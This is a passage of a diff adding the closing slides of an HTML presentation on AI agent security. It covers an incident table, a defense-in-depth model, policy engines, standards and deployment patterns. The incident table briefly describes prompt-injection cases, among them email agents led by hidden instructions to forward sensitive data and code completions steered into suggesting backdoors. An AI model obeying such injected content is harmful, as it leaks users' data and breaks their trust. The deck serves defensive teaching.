+    <p>Pin dependencies to <span class="g">specific versions + hashes</span>. Use verified, signed packages. Scan container images. Maintain <span class="g">curated allowlists</span> of approved tools. Implement code signing for tool distributions.</p>
+  </div>
+  <div class="slide-footer">agent-security / 16</div>
+</section>
+
+<!-- SLIDE 17: Real-World Incidents -->
+<section>
+  <div class="slide-hdr"><span class="tag">INCIDENTS</span><h2>Real-World Incidents and CVEs</h2></div>
+  <table>
+    <thead>
+      <tr><th>System</th><th>Issue</th><th>Impact</th><th>Root Cause</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><span class="a">Open Interpreter</span></td><td>No sandboxing</td><td>Unrestricted file/network/code access</td><td>Design: capability over security</td></tr>
+      <tr><td><span class="a">AutoGPT</span></td><td>Recursive loops</td><td>Unbounded API costs ($1000s)</td><td>No cost controls or kill switches</td></tr>
+      <tr><td><span class="a">AutoGPT</span></td><td>Destructive actions</td><td>Deleted user files, broke configs</td><td>Excessive agency, no approval gates</td></tr>
+      <tr><td><span class="p">Bing Chat</span></td><td>Indirect injection</td><td>Manipulated responses via web pages</td><td>No input-output separation</td></tr>
+      <tr><td><span class="p">Email agents</span></td><td>Hidden injection</td><td>Forwarded sensitive data externally</td><td>Content processed as instructions</td></tr>
+      <tr><td><span class="b">Code completions</span></td><td>Comment injection</td><td>Suggested insecure code / backdoors</td><td>No distinction: code vs. instructions</td></tr>
+      <tr><td><span class="r">MCP servers</span></td><td>Input validation</td><td>Command injection via tool args</td><td>Args passed directly to shell</td></tr>
+      <tr><td><span class="r">MCP servers</span></td><td>Over-broad caps</td><td>Delete/rename exposed unnecessarily</td><td>No least-privilege in server design</td></tr>
+    </tbody>
+  </table>
+  <div class="slide-footer">agent-security / 17</div>
+</section>
+
+<!-- SLIDE 18: Defense in Depth Architecture -->
+<section>
+  <div class="slide-hdr"><span class="tag">ARCHITECTURE</span><h2>Defense in Depth for Agents</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card green">
+        <h3>Five-Layer Model</h3>
+        <ul>
+          <li><span class="a">Layer 1:</span> Model alignment &mdash; refuse harmful actions (least reliable)</li>
+          <li><span class="g">Layer 2:</span> Application guardrails &mdash; input validation, output filtering, policy enforcement</li>
+          <li><span class="p">Layer 3:</span> Tool-level security &mdash; each tool validates inputs independently</li>
+          <li><span class="b">Layer 4:</span> Infrastructure isolation &mdash; containers, microVMs, network policies</li>
+          <li><span class="r">Layer 5:</span> Monitoring &amp; response &mdash; anomaly detection, kill switches, containment</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <svg class="diagram" viewBox="0 0 280 230" width="260">
+        <rect x="15" y="5" width="250" height="38" rx="5" fill="none" stroke="#f5a623" stroke-width="1.5"/>
+        <text x="140" y="28" text-anchor="middle" fill="#f5a623" font-family="JetBrains Mono" font-size="10">L1: Model Alignment</text>
+        <rect x="15" y="50" width="250" height="38" rx="5" fill="none" stroke="#4ecb8d" stroke-width="1.5"/>
+        <text x="140" y="73" text-anchor="middle" fill="#4ecb8d" font-family="JetBrains Mono" font-size="10">L2: App Guardrails</text>
+        <rect x="15" y="95" width="250" height="38" rx="5" fill="none" stroke="#a78bfa" stroke-width="1.5"/>
+        <text x="140" y="118" text-anchor="middle" fill="#a78bfa" font-family="JetBrains Mono" font-size="10">L3: Tool Security</text>
+        <rect x="15" y="140" width="250" height="38" rx="5" fill="none" stroke="#60a5fa" stroke-width="1.5"/>
+        <text x="140" y="163" text-anchor="middle" fill="#60a5fa" font-family="JetBrains Mono" font-size="10">L4: Infrastructure Isolation</text>
+        <rect x="15" y="185" width="250" height="38" rx="5" fill="none" stroke="#f87171" stroke-width="1.5"/>
+        <text x="140" y="208" text-anchor="middle" fill="#f87171" font-family="JetBrains Mono" font-size="10">L5: Monitoring &amp; Response</text>
+      </svg>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 18</div>
+</section>
+
+<!-- SLIDE 19: Policy Engines and MAC -->
+<section>
+  <div class="slide-hdr"><span class="tag">POLICY</span><h2>Policy Engines and Mandatory Access Controls</h2></div>
+  <div class="cols cols-2">
+    <div class="card amber">
+      <h3>OPA (Open Policy Agent)</h3>
+      <ul>
+        <li>Rego policies evaluate every agent action</li>
+        <li><span class="a">Declarative, auditable</span> rules independent of LLM</li>
+        <li>"deny file write to /etc/*"</li>
+        <li>"require approval if modifying &gt;10 files"</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>ML-Based Classification</h3>
+      <ul>
+        <li>Secondary model classifies actions by <span class="g">risk level</span></li>
+        <li>Smaller, faster than primary agent model</li>
+        <li>Trained specifically on adversarial patterns</li>
+        <li>Complements rule-based filtering</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>SELinux / AppArmor</h3>
+      <ul>
+        <li>Kernel-enforced MAC policies</li>
+        <li>Agent process labeled <code>agent_t</code> &rarr; access only <code>agent_workspace_t</code></li>
+        <li>Cannot be overridden even with <span class="r">root inside container</span></li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Runtime Guardrails</h3>
+      <ul>
+        <li><span class="b">Token-level monitoring</span> for jailbreak patterns</li>
+        <li>Action replay prevention (no re-attempt after deny)</li>
+        <li>Session integrity checks (prompt not corrupted)</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 19</div>
+</section>
+
+<!-- SLIDE 20: Standards and Frameworks -->
+<section>
+  <div class="slide-hdr"><span class="tag">STANDARDS</span><h2>Standards and Frameworks</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card amber">
+        <h3>OWASP Top 10 for Agentic Apps</h3>
+        <ul>
+          <li>1. Excessive Agency</li>
+          <li>2. Prompt Injection</li>
+          <li>3. Insecure Tool Use</li>
+          <li>4. Uncontrolled Resource Consumption</li>
+          <li>5. Insufficient Monitoring</li>
+          <li>6. Improper Credential Handling</li>
+          <li>7. Supply Chain Vulnerabilities</li>
+          <li>8. Multi-Agent Trust Failures</li>
+          <li>9. Data Leakage</li>
+          <li>10. Inadequate Isolation</li>
+        </ul>
+      </div>
+    </div>
+    <div>
+      <div class="card green">
+        <h3>NIST Guidance</h3>
+        <ul>
+          <li><span class="g">AI 100-2</span>: Adversarial ML, prompt injection taxonomy</li>
+          <li><span class="g">SP 800-218A</span>: Secure dev for AI systems</li>
+          <li><span class="g">AI RMF</span>: Risk governance framework</li>
+        </ul>
+      </div>
+      <div class="card purple" style="margin-top:.6em">
+        <h3>Enterprise Adoption</h3>
+        <p>OWASP Top 10 now standard in <span class="p">procurement requirements</span> for agent platforms. Security assessments follow standardized vulnerability taxonomy.</p>
+      </div>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 20</div>
+</section>
+
+<!-- SLIDE 21: Enterprise Deployment Patterns -->
+<section>
+  <div class="slide-hdr"><span class="tag">DEPLOYMENT</span><h2>Enterprise Deployment Patterns</h2></div>
+  <div class="cols cols-2">
+    <div class="card amber">
+      <h3>Gated Agent Pattern</h3>
+      <ul>
+        <li>All actions pass through <span class="a">centralized gateway</span></li>
+        <li>Single point for policy, logging, credentials</li>
+        <li>Agent never directly accesses tools or resources</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Sidecar Proxy Pattern</h3>
+      <ul>
+        <li>Security sidecar (like Envoy) per agent instance</li>
+        <li>Intercepts all tool calls, network requests, file ops</li>
+        <li>Redacts secrets from logs, provides telemetry</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Ephemeral Environment</h3>
+      <ul>
+        <li>Fresh container/microVM per task, <span class="p">destroyed on completion</span></li>
+        <li>No state persists between tasks</li>
+        <li>Eliminates cross-task contamination and persistent compromise</li>
+      </ul>
+    </div>
+    <div class="card blue">
+      <h3>Approval Queue</h3>
+      <ul>
+        <li>High-risk actions queued for <span class="b">human review</span></li>
+        <li>Dashboard: action, reasoning, context, impact</li>
+        <li>Decisions feed back into policy engine for refinement</li>
+      </ul>
+    </div>
+  </div>
+  <div class="slide-footer">agent-security / 21</div>
+</section>
+
+<!-- SLIDE 22: Key Takeaways -->
+<section>
+  <div class="slide-hdr"><span class="tag">SUMMARY</span><h2>Key Takeaways</h2></div>
+  <div class="cols cols-2">
+    <div class="card green">
+      <h3>Core Principles</h3>
+      <ul>
+        <li>Treat the agent as an <span class="r">untrusted workload</span></li>
+        <li><span class="g">Defense in depth</span>: alignment + guardrails + tool security + isolation + monitoring</li>
+        <li>Least privilege via <span class="a">capability-based security</span></li>
+        <li>Design security in from the start, not as a patch</li>
+      </ul>
+    </div>
+    <div class="card amber">
+      <h3>Critical Controls</h3>
+      <ul>
+        <li><span class="a">Container/microVM isolation</span> with deny-by-default networking</li>
+        <li><span class="g">Human-in-the-loop</span> for high-risk operations</li>
+        <li><span class="p">Vault-based credential management</span> &mdash; never env vars</li>
+        <li><span class="b">Structured logging</span> + anomaly detection + kill switches</li>
+      </ul>
+    </div>
+  </div>
+  <div class="card purple" style="margin-top:.8em">
+    <h3>Bottom Line</h3>
+    <p>Agent security is a genuinely new domain. It draws on established principles &mdash; least privilege, defense in depth, input validation &mdash; but the combination of <span class="a">persistent access</span>, <span class="g">tool use</span>, <span class="p">autonomous action</span>, and <span class="b">multi-step reasoning</span> creates attack surfaces that existing frameworks do not fully address. The tools and standards exist; the critical mistake is treating security as an afterthought.</p>
+  </div>
+  <div class="slide-footer">agent-security / 22</div>
+</section>
+
+</div></div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.js"></script>
+<script>Reveal.initialize({hash:true,slideNumber:'c/t',transition:'fade',center:false,transitionSpeed:'fast',margin:0.02,width:1280,height:900});
+</script>
+<script>
+(function(){
+  var h = Reveal.getConfig().height || 900;
+  var m = Reveal.getConfig().margin || 0.02;
+  var maxH = Math.floor(h * (1 - 2 * m)) + 'px';
+  function fixSlides(){
+    document.querySelectorAll('.reveal .slides>section,.reveal .slides>section>section').forEach(function(s){
+      s.style.display = 'block';
+      s.style.maxHeight = maxH;
+    });
+  }
+  Reveal.on('ready', fixSlides);
+  Reveal.on('slidechanged', fixSlides);
+})();
+</script>
+</body></html>
